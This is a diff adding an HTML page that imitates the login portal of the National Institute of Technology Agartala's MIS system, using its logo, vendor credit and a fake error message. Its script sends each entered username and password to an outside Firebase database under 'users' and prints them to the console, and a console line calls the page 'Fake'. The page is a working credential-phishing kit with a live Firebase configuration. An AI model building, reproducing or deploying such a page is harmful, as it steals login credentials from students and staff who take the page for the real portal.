@@ -1,0 +1,133 @@
+
+<html>
+    <head>
+        <!-- CSS only -->
+        <!-- BOOTSTRAP -->
+        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
+        <title>MIS- NIT-Agartala</title>
+
+    </head>
+    <body>
+
+        <div class="container">
+            <div class="row">
+                <div  class="col-md-3">
+                    <img src="https://mis.nita.ac.in/mis/IMAGES/logo.jpg">
+                    <h3>National Institute of Technology Agartala</h3>
+                    <br>
+                    <br>
+                    <h4 style="color: blue;">Server Time :</h4>
+                    <h5 style="color: green;">Error Code: 500</h5>
+                    <br>
+                    <br>
+                    <br>
+                    <br>
+                    <br>
+                    <br>
+                    <br>
+                    <br>
+                    <br>
+                    <h5 style="color: blue;">Contact Us :<span style="color: cornflowerblue;"> banik.pramathesh4u@gmail.com</span></h5>
+                </div>
+
+                <div class="col-md-6">
+                    <p style="color: red;">Unable to render the website properly</p>
+                    <br>
+                    <br>
+                    <br>
+                    <br>
+                    <br>
+                    <br>
+                    <br>
+                    <form id="form">
+                        <div class="container" style="background-color: whitesmoke;">
+                            <p style="color: rgb(110, 110, 251); font-weight: bold;">Login for MIS-MasterSoft</p>
+                            <label for="username"><b>Username</b></label>
+                            <input type="text" id="username" placeholder="Enter Username" name="username" required>
+                            <br>
+                            <label for="psw"><b>Password</b></label>
+                            <input type="password" id="password" placeholder="Enter Password " name="password" required>
+                            <br>
+                            <label for="cap"><b>Captcha</b></label>
+                            <input type="password" placeholder="Enter Captcha " name="psw" required>
+                            <br>
+                            <h4 style="background-color: black;color: white; font-style: italic; width: 70;">146ff0</h4>
+                            <br>
+                            <button type="" style="background-color: teal; color:white" onclick="submitForm()">Login</button>
+                            <button style="background-color:whitesmoke; color:black">T&P SignUp</button>
+                          </div>
+                        
+                          <div class="container" style="background-color:#f1f1f1">
+                           
+                            <span class="psw">Forgot <a href="#">password?</a></span>
+                          </div>
+                    </form>
+                    <br>
+                    
+                    <p>Designed and Developed by: <span style="color: blue; font-weight: bold;">MasterSoft Nagpur</span> Copyright © 2016. All rights reserved.</p>
+                   </div>
+
+                <div class="col-md-2">
+                    <br>
+                    <br>
+                    <h4 style="color: blue;">About Us</h5>
+                        <p style="font-size: 15;">The National Institute of Technology Agartala is one of the thirty one national-level Technical Institutes set up by the government of India. The Institute's mission is "to help to improve the economic development of the country particularly the North-East states and also the public systems, through pursuit of excellence in technical education, research, consultancy and training".</p>    
+                        
+                </div>
+
+            </div>
+            
+            <!-- The core Firebase JS SDK is always required and must be listed first -->
+            <!-- Firebase App (the core Firebase SDK) is always required and must be listed first -->
+            <script src="https://www.gstatic.com/firebasejs/7.15.5/firebase-app.js"></script>
+
+            <!-- If you enabled Analytics in your project, add the Firebase SDK for Analytics -->
+            <script src="https://www.gstatic.com/firebasejs/7.15.5/firebase-analytics.js"></script>
+            <script src="https://www.gstatic.com/firebasejs/7.15.5/firebase-database.js"></script>
+
+            <!-- Add Firebase products that you want to use -->
+            <script src="https://www.gstatic.com/firebasejs/7.15.5/firebase-auth.js"></script>
+            <script src="https://www.gstatic.com/firebasejs/7.15.5/firebase-firestore.js"></script>
+
+            <script>
+                console.log('We are Fake. We are Legion. Hail HYDRA. ~Winter S.');
+
+
+                var firebaseConfig = {
+                    apiKey: "AIzaSyCQ_3PQlyDDR01ecIob8sGO5Mlq-9IwP0s",
+                    authDomain: "myawesome-772e0.firebaseapp.com",
+                    databaseURL: "https://myawesome-772e0.firebaseio.com",
+                    projectId: "myawesome-772e0",
+                    storageBucket: "myawesome-772e0.appspot.com",
+                    messagingSenderId: "497045934001",
+                    appId: "1:497045934001:web:1f0f350e0dafb823227790",
+                    measurementId: "G-NJNZ0MQ96E"
+                };
+
+                firebase.initializeApp(firebaseConfig);
+                firebase.analytics();
+                var db = firebase.database().ref();
+                console.log("firebase init")
+
+                function submitForm()
+                {
+                    console.log("function called")
+                    var username = document.getElementById("username").value;
+                    var password = document.getElementById("password").value;
+
+                    console.log(username);
+                    console.log(password);
+
+                    firebase.database().ref('users').push({username: username, pass: password});
+
+
+                }
+
+                function getInpVal(id)
+                {
+                    return document.getElementById(id).value;
+                }
+            </script>
+
+    </body>
+</html>
